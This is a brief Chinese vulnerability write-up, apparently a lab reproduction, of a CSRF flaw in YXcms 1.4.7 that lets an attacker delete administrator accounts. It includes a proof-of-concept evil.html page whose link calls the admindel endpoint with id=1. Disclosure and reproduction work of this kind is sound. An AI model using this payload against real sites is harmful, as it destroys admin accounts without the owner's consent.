### 1.漏洞简介 ###
YXcms 1.4.7版本中的protected/apps/admin/controller/adminController.php文件存在跨站请求伪造漏洞。远程攻击者可借助index.php?r=admin/admin/admindel利用该漏洞删除管理员账户。
###2.影响版本 ###
YXcms 1.4.7
###3. 复现过程 ###
管理员点击链接

    http://192.168.232.133/evil.html


evil.html

    <html> 
    <a href="http://127.0.0.1/yxcms1.4.7/index.php?r=admin/admin/admindel&id=1">test</a>
    </html>
    